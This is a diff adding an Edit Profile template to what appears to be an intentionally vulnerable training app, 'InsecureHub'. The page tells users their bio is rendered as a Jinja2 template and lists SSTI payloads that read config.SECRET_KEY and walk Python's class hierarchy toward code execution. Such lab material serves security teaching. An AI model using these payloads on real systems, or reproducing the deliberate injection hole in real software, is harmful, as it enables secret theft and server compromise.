@@ -1,0 +1,38 @@
+{% extends "base.html" %}
+{% block title %}Edit Profile — InsecureHub{% endblock %}
+{% block content %}
+<div class="page-container">
+    <div class="page-header">
+        <h1 class="page-title">Edit Profile</h1>
+        <p class="page-subtitle">Update your profile information</p>
+    </div>
+
+    <div class="form-card">
+        <form method="POST" action="{{ url_for('edit_profile') }}" class="form">
+            <div class="form-group">
+                <label class="form-label" for="bio">Bio</label>
+                <textarea id="bio" name="bio" class="form-textarea" rows="6"
+                    placeholder="Tell us about yourself...">{{ user.bio or '' }}</textarea>
+                <div class="form-hint">
+                    ⚠ Your bio is rendered as a Jinja2 template. Try: <code>{{ '{{' }} 7*7 {{ '}}' }}</code>
+                </div>
+            </div>
+            <div class="form-actions">
+                <button type="submit" class="btn btn-primary" id="save-profile-btn">Save Changes</button>
+                <a href="{{ url_for('profile', user_id=session.user_id) }}" class="btn btn-ghost">Cancel</a>
+            </div>
+        </form>
+    </div>
+
+    <div class="hint-box hint-vuln">
+        <span class="hint-title">🔥 SSTI Payloads to Try</span>
+        <div class="payload-list">
+            <code>{{ '{{' }} 7*7 {{ '}}' }}</code>
+            <code>{{ '{{' }} config {{ '}}' }}</code>
+            <code>{{ '{{' }} config.SECRET_KEY {{ '}}' }}</code>
+            <code>{{ '{%' }} for x in range(10) {{ '%}' }}{{ '{{' }}x{{ '}}' }}{{ '{%' }} endfor {{ '%}' }}</code>
+            <code>{{ '{{' }} ''.__class__.__mro__[1].__subclasses__() {{ '}}' }}</code>
+        </div>
+    </div>
+</div>
+{% endblock %}
